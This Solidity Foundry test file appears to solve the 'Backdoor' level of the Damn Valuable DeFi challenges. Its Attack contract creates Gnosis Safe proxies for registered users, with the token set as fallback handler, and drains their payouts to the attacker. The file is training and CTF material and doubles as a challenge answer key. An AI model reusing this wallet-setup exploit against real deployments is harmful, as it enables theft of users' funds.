// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
import {WalletRegistry} from "../../../src/Contracts/backdoor/WalletRegistry.sol";
import {GnosisSafe} from "gnosis/GnosisSafe.sol";
import {GnosisSafeProxyFactory} from "gnosis/proxies/GnosisSafeProxyFactory.sol";
import {GnosisSafeProxy} from "gnosis/proxies/GnosisSafeProxy.sol";
import {Enum} from "gnosis/common/Enum.sol";

contract Backdoor is Test {
    uint256 internal constant AMOUNT_TOKENS_DISTRIBUTED = 40e18;
    uint256 internal constant NUM_USERS = 4;

    Utilities internal utils;
    DamnValuableToken internal dvt;
    GnosisSafe internal masterCopy;
    GnosisSafeProxyFactory internal walletFactory;
    WalletRegistry internal walletRegistry;
    address[] internal users;
    address payable internal attacker;
    address internal alice;
    address internal bob;
    address internal charlie;
    address internal david;

    function setUp() public {
        /**
         * SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE
         */

        utils = new Utilities();
        users = utils.createUsers(NUM_USERS);

        alice = users[0];
        bob = users[1];
        charlie = users[2];
        david = users[3];

        vm.label(alice, "Alice");
        vm.label(bob, "Bob");
        vm.label(charlie, "Charlie");
        vm.label(david, "David");

        attacker = payable(address(uint160(uint256(keccak256(abi.encodePacked("attacker"))))));
        vm.label(attacker, "Attacker");

        // Deploy Gnosis Safe master copy and factory contracts
        masterCopy = new GnosisSafe();
        vm.label(address(masterCopy), "Gnosis Safe");

        walletFactory = new GnosisSafeProxyFactory();
        vm.label(address(walletFactory), "Wallet Factory");

        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        // Deploy the registry
        walletRegistry = new WalletRegistry(
            address(masterCopy),
            address(walletFactory),
            address(dvt),
            users
        );

        // Users are registered as beneficiaries
        for (uint256 i = 0; i < NUM_USERS; i++) {
            assertTrue(walletRegistry.beneficiaries(users[i]));
        }

        // Transfer tokens to be distributed to the registry
        dvt.transfer(address(walletRegistry), AMOUNT_TOKENS_DISTRIBUTED);

        console.log(unicode"🧨 Let's see if you can break it... 🧨");
    }

    function testExploit() public {
        /**
         * EXPLOIT START *
         */
        vm.startPrank(attacker);
        //GnosisSafe gs = new GnosisSafe();
        // for the test we at least should somehow call this proxyCreated function
        // maybe I need somehow create similar to gnosis safe contract in order to imitate it and the wallet registry will send their money to my address instead, idk
        // I've tried approach below, because I was figuring out how to execute transfer on proxy contract, but it was easier than I thought
        //masterCopy.execTransaction(address(dvt), 0, abi.encodeWithSelector(dvt.transferFrom.selector, address(proxy), attacker, AMOUNT_TOKENS_DISTRIBUTED), Enum.Operation.DelegateCall, 500_000, 30000000000, 30000000000,0,0,)
       
        Attack attack = new Attack();
        attack.attack(users, walletFactory, masterCopy, dvt, walletRegistry);
        console.log(dvt.balanceOf(address(attacker)));
        vm.stopPrank();
        /**
         * EXPLOIT END *
         */
        validation();
        console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
    }

    function validation() internal {
        /**
         * SUCCESS CONDITIONS
         */
        for (uint256 i = 0; i < NUM_USERS; i++) {
            address wallet = walletRegistry.wallets(users[i]);

            // User must have registered a wallet
            if (wallet == address(0)) {
                emit log("User did not register a wallet");
                fail();
            }

            // User is no longer registered as a beneficiary
            assertTrue(!walletRegistry.beneficiaries(users[i]));
        }

        // Attacker must have taken all tokens
        assertEq(dvt.balanceOf(attacker), AMOUNT_TOKENS_DISTRIBUTED);
    }
}


contract Attack{
    function attack(address[] calldata users, GnosisSafeProxyFactory walletFactory, GnosisSafe masterCopy, DamnValuableToken dvt, WalletRegistry walletRegistry) external{
        for(uint256 i = 0; i < users.length; i++){
            address[] memory _users = new address[](1); 
            _users[0] = users[i];
            GnosisSafeProxy proxy = walletFactory.createProxyWithCallback(address(masterCopy),  abi.encodeWithSelector(GnosisSafe.setup.selector,_users, 1, address(0), 0x0, address(dvt), address(0), 0, address(0)), 42, walletRegistry);
            (bool success, ) = address(proxy).call(abi.encodeWithSelector(dvt.transfer.selector, msg.sender, dvt.balanceOf(address(proxy))));
            require(success);
        }
    }
}